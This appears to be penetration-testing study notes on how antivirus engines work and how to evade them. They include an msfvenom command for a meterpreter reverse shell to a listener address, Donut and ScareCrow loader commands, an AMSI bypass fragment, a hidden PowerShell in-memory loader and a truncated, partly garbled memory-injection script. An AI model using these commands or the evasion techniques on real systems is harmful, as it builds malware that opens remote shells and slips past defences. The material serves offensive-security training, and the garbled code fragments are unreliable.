TLDR;

EV signatures change weekly, so the lab notebook emphasises process over recipes. Here’s the enriched workflow that survived testing.

Profile the Target Engine

  • Collect product/version (Get-MpComputerStatus, wmic /namespace:\\root\SecurityCenter2 path AntiVirusProduct).
  • Identify telemetry: does it ship logs to Defender for Endpoint, Carbon Black, CrowdStrike? Note event IDs and storage paths.
  • Understand scanning modes (on-access, scheduled, cloud lookups) and file reputation rules.

On-Disk Obfuscation

  1. Generate baseline payload: msfvenom -p windows/x64/meterpreter/reverse_https LHOST=... -f raw.
  2. Repackage with custom loaders:
    • Donut ➜ shellcode wrapper.
    • ScareCrow ➜ AMSI-aware loader with randomised imports.
    • pezor ➜ PE packer with API hashing.
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.49.1 LPORT=4443 -f raw > payload.bin
./donut -f payload.bin -o payload.js
./scarecrow -i payload.bin -domain corp.local -out beacon.exe
  1. Modify PE metadata (timestamps, section names) using pefile or sigcheck -q -m to verify changes.
  2. Sign payloads with client-provided certs when available; log thumbprints.

In-Memory & LOLBAS Techniques

  • Use VirtualAlloc ➜ RtlMoveMemory ➜ CreateThread flow for reflective loaders; keep the loader <3 KB to dodge heuristics.
  • Leverage AMSI bypasses responsibly ([Ref].Assembly.GetType("System.Management.Automation.AmsiUtils")…); rotate strings and obfuscation each run.
  • Abuse LOLBAS binaries (installutil.exe, msbuild.exe, rundll32.exe) to execute payloads without touching disk.
powershell -nop -w hidden -c "[System.Reflection.Assembly]::Load([Convert]::FromBase64String('<base64 loader>')); Invoke-EntryPoint"

Testing Matrix

  • Validate in isolated VMs for each AV product; capture detection verdicts (blocked, quarantined, allowed) and log them.
  • Record hash values (MD5/SHA256), VT hits, and behavioural detections for the report.
  • Keep a spreadsheet of loader versions, obfuscation options, and success rates.

Defensive Recommendations

  • Encourage clients to enable cloud-delivered protection, script block logging, and AMSI integrations.
  • Suggest application control (AppLocker/WDAC), PowerShell Constrained Language Mode, and EDR monitoring for LOLBAS anomalies.
  • Share IOC samples (filenames, hashes, mutexes, network indicators) generated during testing.

AV evasion is an engineering treadmill. Capture every knob you turn, test across engines, and pair offensive success with actionable defensive guidance.

14.1 Antivirus Software Key Components and Operations

-

  • Recognize known vs unknown threats.
  • Understand AV key components.

Known vs Unknown Threats

Originally AV was based on signatures. Signature languages are unique to each AV engine. The signature languages vary, on one engine the signature may analyze the malware's signature on disk where another may analyze it's network traffic.

In 2014 a sig language called YARA was open-sourced, allowing researchers to query the VirusTotal platform, even integrating their own signatures into AV products.

  • VirusTotal is an AV search engine.
  • Search known malware.
  • Submit samples and test against known.

Signatures are written based on known threats, initially AV could only detect malware that had already been documented. Modern AV, including Win Defender, integrate a Machine Learning engine that is called whenever an unknown file is discovered on the system. ML Engines, operate in the cloud, and require an internet connection, which is often not an option on internal enterprise servers. AV engines should not borrow too much resource from the system.

To overcome the limits, Endpoint Detection and Response (EDR) have been evolving. The EDR generates security event telemetry and forwards it to the SIEM. The SIEM is monitored by teams of analysts, giving them a full overview of the org, any past or ongoing attack.

AV and EDR are not mutually exclusive, they compliment each other. Their deployment is based on internal network arch.

AV Engines and Components

Modern AV relies on signature updates, retrieved from the vendor's DB, over the internet. The signatures are stored in a local sig DB, where they are utilized by the engine components;

  • File Engine.
  • Responsible for scheduled and real-time file scans.
  • Scheduled scan.
  • Parses the entire file system, sending each files metadata to the sig engine.
  • Real-time.
  • Detecting and possibly reacting to any new file action, i.e. downloading malware from a website.
  • IDs events a the kernel level via special mini-filter driver. - This is why modern AV operates in Kernel and User land to validate the entire OS scope.
  • Memory Engine.
  • Inspects each processes mem space at runtime for well-known binary sigs and suspicious API call that may result in mem injection attacks.
  • Network Engine.
  • Inspects incoming and outgoing network traffic on the local net iface.
  • When a sig is matched, the net eng may attempt to block malware from comm with it's C2 server.
  • Disassembler.
  • Translates machine code into asm.
  • Reconstructing the original code section.
  • IDs encode/decode routines.
  • Emulator/Sandbox.
  • Isolate and load malware for analysis.
  • Once loaded and running in the emulated sandbox it is thoroughly analyzed against known sigs.
  • Browser Plugin.
  • Browsers are protected by a sandbox, modern AV uses browser plugins to get visibility and detect mal content exec in browser.
  • Machine Learning Engine.
  • Vital part of modern AV, enables the detection of unknown threats by relying on cloud enhanced computing resources.

These engines work in concert with the sig DB to rank events as benign, malicious, or unknown.

Detection Methods

AV sig syntax and scope differs based on the engine they are built for, but serve the same purpose. Detection methodologies;

  • Signature-based Detection.
  • Restricted list technology.
  • Scans for known sigs.
  • Sigs can be a file hash, set of patterns, specific binary vals and strings belonging to each specific malware.
  • Weak method, changing a single bit results in a completely diff hash.
  • Heuristic-based Detection
  • Relies on rules and algorithms to make determination.
  • Steps through instruction set of binary file or decompile/analyze the source code to map the program.
  • Behavioral Detection
  • Dynamically analyzes the the behavior of a binary file .
  • Achieved by exec in sandbox and searching for behavior considered malicious.
  • Machine Learning Detection
  • Uses ML algorithms to detect unknown threats.
  • Collects and analyzes metadata.
  • Example; Win Defender has 2 ML components.
  • Client ML engine.
  • Creates ML models and heuristics.
  • Cloud ML engine.
  • Analyze submitted samples against cloud DB of metadata based models of other submitted samples.
  • When client ML is unable to determine benign or not, it passes it to the cloud ML for final response.
  • Doesn't require sigs and can detect unknown threats.
  • Methods differ by AV vendor and results differ as well.

To demonstrate this, we will scan a Metasploit payload. Using Msfvenom we will generate a standard Win PE containing our payload, a simple TCP rev shell. The PE file format is used on Windows operating systems for executable and object files. The PE format represents a Windows data structure that details the information necessary for the Windows Loader7 to manage the wrapped executable code including required dynamic libraries, API import and export tables, etc.

14.1 Bypassing Antivirus Detections

  • Understand on-disk evasion techniques.
  • Understand in-memory evasion techniques.
On-Disk Evasion
  • Modern malware obfuscation takes many forms.
  • One of the earliest methods is the use of packers
  • Designed to reduce size of executable.
  • Generate an exe that is smaller, functionally equivalent, with a new binary structure.
  • Has a new hash sig and can bypass older AV methods based on file sig.
  • Modern malware uses variations, UPX and other packers alone are not enough to evade modern AV.
  • Obfuscators.
  • Mutate code making it harder to reverse-engineer.
  • Replaces instructions with semantic equiv.
  • Insert dead code
  • Split/reorder funcs.
  • Primarily used by software developers to protect their IP.
  • Marginally effective against sig based AV methods.
  • Modern obfuscators have runtime in-mem capabilities, hinder AV detection further.
  • Crypter.
  • Cryptographically alters exe.
  • Adds decrypt stub that restore OG code on exec.
  • Decrypt happends in mem, leaving encrypted code on disk.
  • Foundational in modern malware as one of the most effective evasion techniques.

Effective evasion requires a combination of techniques and more advanced methods;

  • Anti-reversing.
  • Anti-debugging.
  • VM emulation detection.
  • Software protectors.
  • Designed for legit purposes, but can be used to bypass AV.

There are several actively-maintained free tools that provide adequate AV evasion. Commercial tools, such as The Enigma Protector, can bypass many AV products.

In-Memory Evasion
  • In-Memory Injections
  • Aka PE Injection.
  • Popular technique for bypassing AV on Win.
  • Focuses on manipulation of volatile mem.
  • Does not write to disk.
  • Common focus of most AV solutions.
  • Several evasion techniques do not write to disk.
  • Remote Process Memory Injection.
  • Injects payload into a benign PE.
  • Common method leverages Win APIs
    • To achieve;
      • OpenProcess
    • Obtain valid HANDLE of target process.
      • Allocate mem in the context of that process by calling WIN API such as;
        • VirtualAllocEx
  • Copy payload into alloc mem. - WriteProcessMemory
  • Exec in mem. - CreateRemoteThread
  • Though complex, Powershell can do the heavy lifting in most cases.
  • Reflective DLL Injection.
  • Unlike regular DLL injection, where the DLL is loaded from disk using the LoadLibrary API, this method attempts to load a DLL stored by the attacker in process memory.
  • Challenge being LoadLibrary does not support loading a DLL from memory.
  • Win also does not expose and API that can handle this.
  • Attacker must write their own version of the API that does not require disk based DLL loading.
  • Process Hollowing.
  • FIrst launch a benign process in a suspended state.
  • Once launched, the image of the proc is removed from mem and replaced with mal exec image.
  • Finally, process is resumed and mal code is executed in place of legit proc.
  • Inline Hooking.
  • Modify memory to introduce a hook (instruction redirecting code for exec)
  • Upon redirection and exec of mal code the the flow returns back to the modified func appearing as only the legit code had executed.
  • Often employed by rootkits.
  • Stealthy malware, provide author with persistent dedicated access to the target system.
  • Modifies system components in;
  • User space.
  • Kernel.
  • Lower OS protection rings. - Boot. - Hypervisor.
  • Need admin privs.
  • Often installed from an elevated shell or by privesc.

Testing for AV Evasion

SecOps; joint collab between enterprise IT and SOC, goal is to provide continuous detection/protection against well-known and novel threats. As a pentester you have to have an understanding of the implications dealing with SecOps teams.

Example;

  • VirusTotal can give us an idea of how stealthy our malware is.
  • The platform sends all samples to AV vendors subscribed to their platform.
  • Therefore shortly after submitting a sample, AV vendors can run the mal in their sandbox and ML engines to build detection sigs.
  • Rendering the mal unusable.
  • AntiScan.Me scans against 30 diff AV engines and claims to not divulge samples to 3rd parties.
  • This is a last resort when we don't know the target's AV vendor.
  • If we know the target's AV vendor.
  • We should build a VM similar to the target env.

Regardless of AV product we are testing, we should disable sample submission to prevent the same drawback as virus total. In Win Defender;

  • Windows Security.
  • Virus & Thread Protection.
  • Manage Settings.
  • Deselect automatic sample submission.
  • Only enable it when we are confident in our bypass method and if the target has it enabled in their env.
  • Since both Windows Defender cloud protection and automatic sample submission require internet connectivity, we should first verify that this is reflected in our target environment: some company policies mandate limited internet access to some production servers and as a consequence, some advanced AV features are inhibited..

As a rule of thumb, always prefer custom code when developing bypasses. AV signatures are extrapolated from the malware sample, the more novel the code, the lower the likelihood of detection.

Evading AV with Thread Injection

Finding a universal solution to bypass all AV engine is difficult, time consuming, and possibly impossible. It is far more effective to target the specific AV solution deployed by the target.

In our examples, we will interact with Avira Free Security version 1.1.68.29553 on a Win 11 client. As a first step in working with AV, make sure the system is working as intended by testing it with the basic Msfvenom PE we created earlier.

Depending on how restricted the target env is, we may be able to bypass the AV product with PowerShell. This example will utilize the remote process memory injection technique, similar to what we described previously, but we will target the currently executing process (x86 PowerShell interpreter).

PowerShell can interact with the Windows API, allowing us to implement in-memory injection using a PowerShell script. It's harder for AV to determine if a script is malicious compared to a PE, the script itself is not exec code and runs in the interpreter. AV solutions handle mal script detection with varying degrees of success.

In the event the script is marked as mal, it can be easily altered. AV will often review the variable names, comments, and logic which can be altered without the need to recompile.

To demonstrate, we will analyze a well-known version of a memory injection PowerShell script and test it against it with Avira. The basic template for memory injection;

$winFunc = 
  Add-Type -memberDefinition $code -Name "Win32" -namespace Win32Functions -passthru;

[Byte[]];

$size = 0x1000;

for ($i=0;$i -le ($sc.Length-1);$i++) {$winFunc::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};
